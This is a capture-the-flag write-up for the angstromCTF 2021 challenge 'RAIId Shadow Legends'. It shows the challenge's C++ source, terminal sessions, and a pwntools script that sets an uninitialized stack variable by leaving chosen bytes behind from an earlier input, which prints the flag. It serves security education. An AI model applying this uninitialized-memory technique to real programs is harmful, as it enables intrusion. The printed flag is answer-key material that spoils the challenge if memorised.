# RAIId Shadow Legends

## Description

```  
I love how C++ initializes everything for you. It makes things so easy and
fun!

Speaking of fun, play our fun new game RAIId Shadow Legends (source) at
/problems/2021/raiid_shadow_legends on the shell server, or connect with nc
shell.actf.co 21300.

Author: kmh  
```

## Analysis

Let's take a look at `raiid_shadow_legends.cpp`.

`main()` prompts for an action. The only thing that's useful is option 1,
which will call `terms_and_conditions()` followed by `play()`.

```cpp  
int main() {  
       setresgid(getegid(), getegid(), getegid());  
       cout << "Welcome to RAIId Shadow Legends!" << endl;  
       while (true) {  
               cout << "\n1. Start game" << endl;  
               cout << "2. Purchase shadow tokens\n" << endl;  
               cout << "What would you like to do? " << flush;  
               string action;  
               cin >> action;  
               cin.ignore();  
               if (action == "1") {  
                       terms_and_conditions();  
                       play();  
               } else if (action == "2") {  
                       cout << "Please mail a check to RAIId Shadow Legends Headquarters, 1337 Leet Street, 31337." << endl;  
               }  
       }  
}  
```

`terms_and_conditions()` just prompts for an agreement and signature:

```cpp  
void terms_and_conditions() {  
       string agreement;  
       string signature;  
       cout << "\nRAIId Shadow Legends is owned and operated by Working Group 21, Inc. ";  
       cout << "As a subsidiary of the International Organization for Standardization, ";  
       cout << "we reserve the right to standardize and/or destandardize any gameplay ";  
       cout << "elements that are deemed fraudulent, unnecessary, beneficial to the ";  
       cout << "player, or otherwise undesirable in our authoritarian society where ";  
       cout << "social capital has been eradicated and money is the only source of ";  
       cout << "power, legal or otherwise.\n" << endl;  
       cout << "Do you agree to the terms and conditions? " << flush;  
       cin >> agreement;  
       cin.ignore();  
       while (agreement != "yes") {  
               cout << "Do you agree to the terms and conditions? " << flush;  
               cin >> agreement;  
               cin.ignore();  
       }  
       cout << "Sign here: " << flush;  
       getline(cin, signature);  
}  
```

`play()` is where the money's at. We need to control `player.skill` in order
to get the flag. But notice that it's never set or manipulated. Since it's not
initialized, and it's on the stack, there must be some way to leave "garbage"
behind on the stack such that `player.skill == 1337`.

```cpp  
struct character {  
       int health;  
       int skill;  
       long tokens;  
       string name;  
};

void play() {  
       string action;  
       character player;  
       cout << "Enter your name: " << flush;  
       getline(cin, player.name);  
       cout << "Welcome, " << player.name << ". Skill level: " << player.skill << endl;  
       while (true) {  
               cout << "\n1. Power up" << endl;  
               cout << "2. Fight for the flag" << endl;  
               cout << "3. Exit game\n" << endl;  
               cout << "What would you like to do? " << flush;  
               cin >> action;  
               cin.ignore();  
               if (action == "1") {  
                       cout << "Power up requires shadow tokens, available via in app purchase." << endl;  
               } else if (action == "2") {  
                       if (player.skill < 1337) {  
                               cout << "You flail your arms wildly, but it is no match for the flag guardian. Raid failed." << endl;  
                       } else if (player.skill > 1337) {  
                               cout << "The flag guardian quickly succumbs to your overwhelming power. But the flag was destroyed in the frenzy!" << endl;  
                       } else {  
                               cout << "It's a tough battle, but you emerge victorious. The flag has been recovered successfully: " << flag.rdbuf() << endl;  
                       }  
               } else if (action == "3") {  
                       return;  
               }  
       }  
}  
```

If we provide only expected input, `player.skill` will be 0.

```  
kali@kali:~/Downloads/angstrom/raiid_shadow_legends$ ./raiid_shadow_legends  
Welcome to RAIId Shadow Legends!

1. Start game  
2. Purchase shadow tokens

What would you like to do? 1

RAIId Shadow Legends is owned and operated by Working Group 21, Inc. As a
subsidiary of the International Organization for Standardization, we reserve
the right to standardize and/or destandardize any gameplay elements that are
deemed fraudulent, unnecessary, beneficial to the player, or otherwise
undesirable in our authoritarian society where social capital has been
eradicated and money is the only source of power, legal or otherwise.

Do you agree to the terms and conditions? yes  
Sign here: no  
Enter your name: foobar  
Welcome, foobar. Skill level: 0

1. Power up  
2. Fight for the flag  
3. Exit game

What would you like to do? 2  
You flail your arms wildly, but it is no match for the flag guardian. Raid
failed.  
```

I spent some time fumbling around passing large inputs into `player.name`, but
these are C++ strings(based on vectors) so it's clearly not a buffer overflow.

Kudos to my team mate [datajerk](https://github.com/datajerk) for figuring out
that we can manipulate `player.skill` via the `agreement` string in
`terms_and_conditions()`:

```  
kali@kali:~/Downloads/angstrom/raiid_shadow_legends$ ./raiid_shadow_legends  
Welcome to RAIId Shadow Legends!

1. Start game  
2. Purchase shadow tokens

What would you like to do? 1

RAIId Shadow Legends is owned and operated by Working Group 21, Inc. As a
subsidiary of the International Organization for Standardization, we reserve
the right to standardize and/or destandardize any gameplay elements that are
deemed fraudulent, unnecessary, beneficial to the player, or otherwise
undesirable in our authoritarian society where social capital has been
eradicated and money is the only source of power, legal or otherwise.

Do you agree to the terms and conditions? yesAAAA  
Do you agree to the terms and conditions? yes  
Sign here: foo  
Enter your name: foo  
Welcome, foo. Skill level: 4276545

1. Power up  
2. Fight for the flag  
3. Exit game

What would you like to do?  
```

`4276545` is `0x414141` (or `AAA`).

## Solution

Now that we know how to manipulate `player.skill` we just have to get `0x539`
(`1337`) in there to print the flag.

```python  
#!/usr/bin/env python3  
from pwn import *  
p = process('./raiid_shadow_legends')  
p.recvuntil('What would you like to do?')  
p.sendline('1')  
p.recvuntil('Do you agree to the terms and conditions?')  
p.sendline(b'yes\0' + p32(0x539))  
p.recvuntil('Do you agree to the terms and conditions?')  
p.sendline('yes')  
p.recvuntil('Sign here:')  
p.sendline('foo')  
p.recvuntil('Enter your name:')  
p.sendline('foo')  
p.recvuntil('What would you like to do?')  
p.sendline('2')  
p.recvuntil("It's a tough battle, but you emerge victorious. The flag has been
recovered successfully: ")  
flag = p.recvline()  
print(flag)  
```

```  
team8838@actf:/problems/2021/raiid_shadow_legends$ ~/solve.py  
[+] Starting local process './raiid_shadow_legends': pid 1473059  
b'actf{great_job!_speaking_of_great_jobs,_our_sponsor_audible...}\n'  
```  

Original writeup
(https://github.com/dobsonj/ctf/tree/master/writeups/2021/angstromctf/raiid_shadow_legends).